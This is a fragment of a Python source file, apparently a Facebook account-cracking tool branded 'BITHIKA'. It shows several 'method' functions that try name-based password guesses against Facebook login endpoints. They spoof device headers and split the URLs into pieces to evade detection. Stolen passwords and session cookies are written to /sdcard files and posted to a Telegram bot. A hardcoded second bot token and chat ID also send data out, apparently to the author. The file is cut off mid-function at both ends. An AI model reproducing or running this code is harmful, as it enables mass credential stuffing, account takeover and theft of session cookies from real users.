                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                cid = str(q['uid'])
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                        cek_apk(kuki)
                        statusok = (f" {cid} | {pas} | {kuki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                        stasok = (f" {usragnt} ")
                        requests.post(f"https://api.telegram.org/bot"+str('7179860898:AAEs3yZDMXPfsCCduMWlMTOOoAEKazCMy6Q')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(stasok))
                        oks.append(cid)
                        break
            elif 'access_token' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                cid = str(q['uid'])
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                        cek_apk(kuki)
                        statusok = (f" {cid} | {pas} | {usragnt} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                        stasok = (f" {kuki} ")
                        requests.post(f"https://api.telegram.org/bot"+str('7179860898:AAEs3yZDMXPfsCCduMWlMTOOoAEKazCMy6Q')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(stasok))
                        oks.append(cid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass


def m8(ids,pwv):
    global loop,oks,cps
    model=["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
    uax = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950308;FBDM/{density=2.325,width=1200,height=1854};FBLC/ru_RU;FBRV/336982524;FBCR/Beeline;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/"+str(random.choice(sm_mdl))+";FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M8{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    usragnt = DEF4()
    warna = random.choice(my_color)
    try:
        for pas in pwv:
            info= {'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            update={'User-Agent':usragnt,
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'htt'+'ps://b-'+'api.face'+'book.com/auth/login'
            q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
            if 'access_token' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                cid = str(q['uid'])
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                        cek_apk(kuki)
                        statusok = (f" {cid} | {pas} | {kuki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                        stasok = (f" {usragnt} ")
                        requests.post(f"https://api.telegram.org/bot"+str('7179860898:AAEs3yZDMXPfsCCduMWlMTOOoAEKazCMy6Q')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(stasok))
                        oks.append(cid)
                        break
            elif 'access_token' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                cid = str(q['uid'])
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                        cek_apk(kuki)
                        statusok = (f" {cid} | {pas} | {kuki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                        stasok = (f" {usragnt} ")
                        requests.post(f"https://api.telegram.org/bot"+str('7179860898:AAEs3yZDMXPfsCCduMWlMTOOoAEKazCMy6Q')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(stasok))
                        oks.append(cid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass



def __FILEX__():
    global oks,cps
    ____banner____()
    dfile = input(f'{rad}[{white}🔖{rad}] {green}EXAMPLE {rad}[{white}/sdcard/BITHIKA.txt{rad}]\n{rad}[{white}🔖{rad}] {green}INPUT FILE PATH {white}▶︎ {yelloww}');linex()
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{rad}[×] FILE NOT FOUND...');time.sleep(1);__FILEX__()
    dplist = []
    try:
        pass_lmit = int(input(f'{rad}[{white}🔖{rad}] {green}INPUT PASS LIMITS {white}▶︎ {yelloww}'));linex()
    except:
        pass_lmit = 3
    for i in range(pass_lmit):
        dplist.append(input(f'{rad}[{white}🔖{rad}] {green}EXAMPLE {rad}[{white}firstlast-first@12-ETC{rad}]\n{rad}[{white}🔖{rad}] {green}PASSWORD ➡ {i+1} {white}▶︎ {yelloww}'));linex()
    __METHOD__ = input(f"{rad}[{white}A{rad}]{green} METHOD M1\n{rad}[{white}B{rad}] {green}METHOD M2 \n{rad}[{white}C{rad}] {green}METHOD M3 \n{rad}[{white}D{rad}] {green}METHOD M4\n{rad}[{white}E{rad}] {green}METHOD M5 \n{rad}[{white}F{rad}] {green}METHOD M6 \n{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{rad}[{white}🔖{rad}] {green}SELECTION {white}▶︎ {yelloww}");os.system('clear')
    with ThreadPool(max_workers=30) as BITHIKA:
        ____banner____();total_ids = str(len(dx))
        print(f'{rad}[{white}🔖{rad}] {green}TOTAL IDS  {white}▶︎ \x1b[38;5;38m{total_ids}{rad} ! {green}METHOD {white}▶︎ \x1b[38;5;38m{__METHOD__}')
        print(f'{rad}[{white}🔖{green}] TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' )
        linex()
        for user in dx:
            ids,names = user.split('|')
            passlist = dplist
            if __METHOD__ in ["A","a","1","01"]:
                BITHIKA.submit(__MTDONEE__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["B","b","2","02"]:
                BITHIKA.submit(__MTDTWOO__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["C","c","3","03"]:
                BITHIKA.submit(__MTDTHREE__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["D","d","4","04"]:
                BITHIKA.submit(__MTDFOUR__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["E","e","5","05"]:
                BITHIKA.submit(__MTDFIVE__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["F","f","6","06"]:
                BITHIKA.submit(__MTDSIX__,ids,names,passlist,total_ids)
            else:
                BITHIKA.submit(__MTDONEE__,ids,names,passlist,total_ids)
    print('');linex()
    print(f"{rad}[{white}🔖{rad}] {green}THE PROCESS HAS COMPLETE")
    print(f"{rad}[{white}🔖{rad}] {green}TOTAL OKS  {white}▶︎ {green}{len(oks)}")
    linex();exit()

def __MTDONEE__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{animasi}-M1{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            cban = str(random.randint(20000000, 30000000))
            user_agent = DEF1()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4()).upper()
            device_id = str(uuid.uuid4()).upper()
            family_device_id = str(uuid.uuid4()).upper()
            advertiser_id = str(uuid.uuid4()).upper()
            data = {
                "adid": f"{adid}",
                "device_id": f"{device_id}",
                "family_device_id": f"{family_device_id}",
                "secure_family_device_id": f"{advertiser_id}",
                "access_token": "6628568379|c1e620fa708a1d5696fb991c1bde5662",
                "sdk_version": str(random.randint(1,26)),
                "email": ids,
                "password": pas,
                "sdk": "android",
                "locale": random.choice(["en_US","en_GB","bn_IN","in_ID"]),
                "generate_session_cookies": "1",
                "sig": "c1e620fa708a1d5696fb991c1bde5662",}
            headers = [
                "Host: graph.facebook.com",
                f"x-fb-connection-bandwidth: {cban}",
                f"x-fb-sim-hni: {netheni}",
                f"x-fb-net-hni: {simheni}",
                "x-fb-connection-quality: EXCELLENT",
                "content-type: application/x-www-form-urlencoded",
                "x-fb-http-engine: Liger",
                f"User-Agent: {user_agent}",
            ]
            url = "https://a"+"pi.face"+"book.c"+"om/a"+"uth/login"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://ap'+'i.faceb'+'ook.com/au'+'th/login')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                print(f'\r\r{rad}[{green}BITHIKA-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{kuki}")
                cek_apk(kuki)
                oks.append(ids)
                statusok = (f" {ids} | {pas} | {kuki} ")
                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                open('/sdcard/BITHIKA-M1-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/BITHIKA-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[BITHIKA-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/BITHIKA-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass


def __MTDTWOO__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{animasi}-M2{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = DEF2()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = [
                f'User-Agent: {user_agent}',
                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: MOBILE.LTE',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62',
            ]
            url = "https://ap"+"i.face"+"book.com/au"+"th/login"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://ap'+'i.face'+'book.com/au'+'th/login')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                print(f'\r\r{rad}[{green}BITHIKA-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{kuki}")
                cek_apk(kuki)
                oks.append(ids)
                statusok = (f" {ids} | {pas} | {kuki} ")
                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                open('/sdcard/BITHIKA-M2-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/BITHIKA-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[BITHIKA-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/BITHIKA-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass


def __MTDTHREE__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{animasi}-M3{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent =  DEF3()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = [
                f'User-Agent: {user_agent}',
                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: MOBILE.LTE',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62',
            ]
            url = "https://a"+"pi.face"+"book.com/au"+"th/login"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://a'+'pi.faceb'+'ook.com/au'+'th/login')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                print(f'\r\r{rad}[{green}BITHIKA-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
                cek_apk(kuki)
                oks.append(ids)
                statusok = (f" {ids} | {pas} | {kuki} ")
                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                open('/sdcard/BITHIKA-M3-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/BITHIKA-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[BITHIKA-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/BITHIKA-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass


def __MTDFOUR__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{animasi}-M4{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = DEF4()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = [
                f'User-Agent: {user_agent}',
                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: MOBILE.LTE',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62'
            ]
            url = 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin'
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin')
            c.setopt(c.HTTPHEADER, headers)
